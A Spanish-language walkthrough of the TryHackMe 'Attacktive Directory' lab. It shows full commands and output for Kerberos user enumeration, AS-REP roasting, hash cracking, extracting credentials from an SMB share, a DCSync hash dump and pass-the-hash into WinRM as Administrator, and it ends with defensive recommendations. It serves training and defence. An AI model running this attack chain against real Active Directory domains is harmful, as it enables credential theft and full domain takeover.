# Attacktive Directory

## Información General
- **Nombre de la máquina**: AttacktiveDirectory
- **Dirección IP**: 10.10.7.146
- **Dominio**: spookysec.local
- **Objetivo**: Obtener acceso como `Administrator` mediante técnicas de post-explotación en un entorno Active Directory.

---
## Parte 1: Reconocimiento y Enumeración
### Teoría
El reconocimiento temprano permite confirmar que el objetivo es un **Domain Controller (DC)**, lo cual es crítico para el flujo ofensivo. Con los puertos abiertos identificamos servicios clave del ecosistema Active Directory, como Kerberos, LDAP y SMB, que definen el camino de ataque.

### Escaneo de puertos
```bash
nmap -sS -p- -n -Pn --min-rate 5000 -vvv 10.10.7.146
nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49666,49669,49672,49674,49676,49679,49684,49697,49836 10.10.7.146

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-29 16:30:00Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-04-29T16:30:58+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2025-04-28T16:21:11
|_Not valid after:  2025-10-28T16:21:11
|_ssl-date: 2025-04-29T16:31:07+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49836/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-29T16:30:57
|_  start_date: N/A
```

### Puertos relevantes encontrados
- **88/tcp** (Kerberos): Principal sistema de autenticación en AD.
- **389/tcp** (LDAP): Permite consultar información de objetos de dominio.
- **445/tcp** (SMB): Acceso a recursos compartidos en red.
- **5985/tcp** (WinRM): Shell remota vía PowerShell, útil para obtener RCE como usuarios válidos.
- **3268/tcp** (LDAP Global Catalog): Usado para búsquedas a nivel de todo el bosque. Su presencia confirma que estamos frente a un DC.
    

---

## Parte 2: Enumeración de usuarios vía Kerberos
### Teoría
Kerberos responde de manera distinta si un usuario existe o no, incluso sin conocer la contraseña. Esto permite enumerar usuarios a través de diferencias en códigos de error.
### Herramienta usada
```bash
kerbrute userenum --dc 10.10.7.146 -d spookysec.local users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 04/29/25 - Ronnie Flathers @ropnop

2025/04/29 20:02:17 >  Using KDC(s):
2025/04/29 20:02:17 >   10.10.7.146:88

2025/04/29 20:02:17 >  [+] VALID USERNAME:       james@spookysec.local
2025/04/29 20:02:21 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2025/04/29 20:02:25 >  [+] VALID USERNAME:       James@spookysec.local
2025/04/29 20:02:26 >  [+] VALID USERNAME:       robin@spookysec.local
2025/04/29 20:02:42 >  [+] VALID USERNAME:       darkstar@spookysec.local
2025/04/29 20:02:51 >  [+] VALID USERNAME:       administrator@spookysec.local
2025/04/29 20:03:11 >  [+] VALID USERNAME:       backup@spookysec.local
2025/04/29 20:03:20 >  [+] VALID USERNAME:       paradox@spookysec.local
2025/04/29 20:04:18 >  [+] VALID USERNAME:       JAMES@spookysec.local
2025/04/29 20:04:38 >  [+] VALID USERNAME:       Robin@spookysec.local
2025/04/29 20:06:35 >  [+] VALID USERNAME:       Administrator@spookysec.local
2025/04/29 20:10:35 >  [+] VALID USERNAME:       Darkstar@spookysec.local
2025/04/29 20:11:51 >  [+] VALID USERNAME:       Paradox@spookysec.local
2025/04/29 20:16:10 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local
2025/04/29 20:17:23 >  [+] VALID USERNAME:       ori@spookysec.local
2025/04/29 20:19:40 >  [+] VALID USERNAME:       ROBIN@spookysec.local
```
### Resultado
Identificamos usuarios válidos como `svc-admin`, `backup`, `administrator`, `robin`, `james`, `paradox`, entre otros.

---

## Parte 3: AS-REP Roasting
### Teoría
Si un usuario no requiere preautenticación, el KDC entrega un ticket cifrado con el hash NTLM del usuario. Esto permite realizar **ataques offline** sin generar eventos de seguridad.
### Herramienta
```bash
GetNPUsers.py spookysec.local/ -dc-ip 10.10.7.146 -usersfile valid_users.txt -no-pass
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/home/kali/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:7cf7087ba77075e5b7a520985acb9585$8f69dd9c916fbd25ce6dd68c5ea34d70efe309f048e566db143aa3446818500158fcfb430dbab28c2960050f95ed7a542751d3c62d229378627994bf1c0a711442ff094d8eedf18472bd46df9af6d3e2789adb5bad4b30743b84b465c2958410fe5e28a34206f13d04b0f541eb6f03960040865efeee4f04411276d7f5042b9285beaa7f1cb686fad613fa354ca54190169b4fdc9cd7c3fc6fd16910e12f9ed6a024eea5444961fe213a1313b56e3c654b591cd3c4c30238df59f9de5c2bfd8c8fd090d00613e6bd39c213b49a31f31fc11e4a2000773104e06cda3ce07a4bb375446830e27569b23b5910875442111f66e8
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
```
### Archivos requeridos
- Lista de usuarios válidos:  
    [userlist.txt](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt)
    
- Lista de contraseñas (para etapas posteriores):  
    [passwordlist.txt](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt)
### Resultado
El usuario `svc-admin` no requería preautenticación. Se extrajo el hash AS-REP para crackeo offline.

---

## Parte 4: Cracking del hash

### Teoría

El hash AS-REP puede ser crackeado con ataques de diccionario si las políticas de contraseñas son débiles.

### Herramienta

```bash
hashcat -m 18200 -a 0 hash.txt passwordlist.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-12th Gen Intel(R) Core(TM) i5-12400F, 2212/4488 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: password.txt
* Passwords.: 70188
* Bytes.....: 569236
* Keyspace..: 70188
* Runtime...: 0 secs

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:7cf7087ba77075e5b7a520985acb9585$8f69dd9c916fbd25ce6dd68c5ea34d70efe309f048e566db143aa3446818500158fcfb430dbab28c2960050f95ed7a542751d3c62d229378627994bf1c0a711442ff094d8eedf18472bd46df9af6d3e2789adb5bad4b30743b84b465c2958410fe5e28a34206f13d04b0f541eb6f03960040865efeee4f04411276d7f5042b9285beaa7f1cb686fad613fa354ca54190169b4fdc9cd7c3fc6fd16910e12f9ed6a024eea5444961fe213a1313b56e3c654b591cd3c4c30238df59f9de5c2bfd8c8fd090d00613e6bd39c213b49a31f31fc11e4a2000773104e06cda3ce07a4bb375446830e27569b23b5910875442111f66e8:management2005
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:7cf7087ba77...1f66e8
Time.Started.....: Tue Apr 29 20:23:39 2025 (0 secs)
Time.Estimated...: Tue Apr 29 20:23:39 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (password.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1249.9 kH/s (1.04ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8192/70188 (11.67%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 6144/70188 (8.75%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: horoscope -> whitey
Hardware.Mon.#1..: Util: 26%

Started: Tue Apr 29 20:23:38 2025
Stopped: Tue Apr 29 20:23:41 2025


```

### Resultado
Credencial recuperada: `svc-admin : management2005`

---

## Parte 5: Enumeración SMB y extracción de secretos
### Teoría
Muchos entornos permiten lectura en recursos compartidos sin control estricto. La exposición de credenciales en texto plano es un error de seguridad frecuente, especialmente cuando los shares contienen scripts, configuraciones o respaldos mal protegidos.
### Herramientas
```bash
smbmap -H 10.10.7.146 -u svc-admin -p management2005
smbclient //10.10.7.146/backup -U svc-admin
```
### Comandos y resultados exactos
#### Enumeración con `smbmap`:
```bash
smbmap -H 10.10.7.146 -u svc-admin -p management2005

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.10.7.146:445 Name: spookysec.local           Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        backup                                                  READ ONLY
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections                                                                                 
```

#### Acceso al share `backup` con `smbclient`:
```bash
smbclient //10.10.7.146/backup -U svc-admin
Password for [WORKGROUP\svc-admin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Apr  4 15:08:39 2020
  ..                                  D        0  Sat Apr  4 15:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020

                8247551 blocks of size 4096. 3583635 blocks available
```
#### Descarga del archivo:
```bash
smb: \> get backup_credentials.txt
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```
#### Lectura del archivo descargado:

```bash
┌──(kali㉿kali)-[~/attacktive_directory]
└─$ cat backup_credentials.txt 
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```
#### Decodificación de la cadena base64:
```bash
┌──(kali㉿kali)-[~/attacktive_directory]
└─$ echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
backup@spookysec.local:backup2517860
```
**Resultado**: Se extrajo una credencial válida en texto plano desde el recurso `backup`:
```
backup@spookysec.local : backup2517860
```
## Parte 6: Dump de Hashes con SecretsDump (DCSync)

### Teoría

El protocolo DRSUAPI permite que controladores de dominio se repliquen entre ellos. Si un usuario tiene privilegios suficientes (como `Backup Operators`), se puede abusar este mecanismo para extraer hashes del dominio.

### Herramienta

```bash
secretsdump.py spookysec.local/backup:backup2517860@10.10.7.146
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
...
```

### Resultado
Hash NTLM del `Administrator` obtenido:
```
0e0363213e37b94221497260b0bcb4fc
```
---

## Parte 7: Acceso con Pass-The-Hash
### Teoría
El protocolo **NTLM** permite autenticación utilizando directamente el **hash NTLM**, sin necesidad de conocer la contraseña en texto plano. Esto permite a un atacante autenticarse mediante técnicas como **Pass-the-Hash**, siempre que el servicio de destino (como **WinRM**) no esté configurado para evitarlo.
### Herramienta
```bash
evil-winrm -i 10.10.7.146 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

### Resultado
Se obtuvo **una shell interactiva como `Administrator`** sobre la máquina objetivo. Durante la sesión, se recorrieron perfiles de usuarios y se identificaron múltiples archivos sensibles con contenido representativo del compromiso.
#### Archivos encontrados:
- **C:\Users\svc-admin\Desktop\user.txt.txt**
```powershell
  *Evil-WinRM* PS C:\Users\svc-admin\Desktop> type user.txt.txt
  TryHackMe{***************}
```
- **C:\Users\backup\Desktop\PrivEsc.txt**
```powershell
  *Evil-WinRM* PS C:\Users\backup\Desktop> type PrivEsc.txt
  TryHackMe{***************}
```
- **C:\Users\Administrator\Desktop\root.txt**
```powershell
  *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
  TryHackMe{***********************}
```
---

## Recomendaciones de Seguridad
1. Forzar preautenticación para todos los usuarios.
2. Restringir acceso a shares con información sensible.
3. Segmentar privilegios: evitar que cuentas no administrativas accedan a `NTDS.dit` o funciones DRSUAPI.
4. Auditar y monitorear el uso de herramientas de replicación.
5. Deshabilitar NTLM o restringir su uso.
6. Aplicar protecciones sobre servicios expuestos como SMB y WinRM (firewall, ACLs, etc).